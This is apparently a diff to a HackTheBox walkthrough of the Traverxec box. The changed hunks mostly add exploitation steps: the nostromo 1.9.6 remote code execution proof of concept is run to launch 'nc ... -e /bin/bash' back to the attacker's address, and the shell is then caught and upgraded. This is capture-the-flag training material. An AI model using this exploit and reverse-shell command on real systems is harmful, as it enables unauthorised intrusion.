@@ -8,7 +8,7 @@ categories: HackTheBox
 
 # Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
-This is a walkthrough of a box `Traverxec`.<br>
+This is a walkthrough of a box `Traverxec`.
 
 # Solution
 ## 1. Initial Enumeration
@@ -75,7 +75,7 @@ Shellcodes: No Result
 ```
 
 Go to the Exploit-db page for <a href="https://www.exploit-db.com/exploits/47837">nostromo 1.9.6 - Remote Code Execution</a>.
-We can download the POC code. The usage is quite simple.
+We can download the POC code and the usage is quite simple.
 ```shell
 root@kali:~# python 47837.py 10.10.10.165 80 id
 
@@ -108,11 +108,30 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 This server has `nc` that has a dangerous option `-e`.<br>
 We can use it for the getting reverse shell.
 ```shell:exploit
+root@kali:~# python 47837.py 10.10.10.165 80 'nc 10.10.14.32 443 -e /bin/bash'
 
+
+                                        _____-2019-16278
+        _____  _______    ______   _____\    \   
+   _____\    \_\      |  |      | /    / |    |  
+  /     /|     ||     /  /     /|/    /  /___/|  
+ /     / /____/||\    \  \    |/|    |__ |___|/  
+|     | |____|/ \ \    \ |    | |       \        
+|     |  _____   \|     \|    | |     __/ __     
+|\     \|\    \   |\         /| |\    \  /  \    
+| \_____\|    |   | \_______/ | | \____\/    |   
+| |     /____/|    \ |     | /  | |    |____/|   
+ \|_____|    ||     \|_____|/    \|____|   | |   
+        |____|/                        |___|/    
 ```
 ```shell:reverse_shell
-
-
+root@kali:~# nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.32] from (UNKNOWN) [10.10.10.165] 33616
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@traverxec:/usr/bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 Look at `/var/nostromo/conf/nhttpd.conf`.<br>
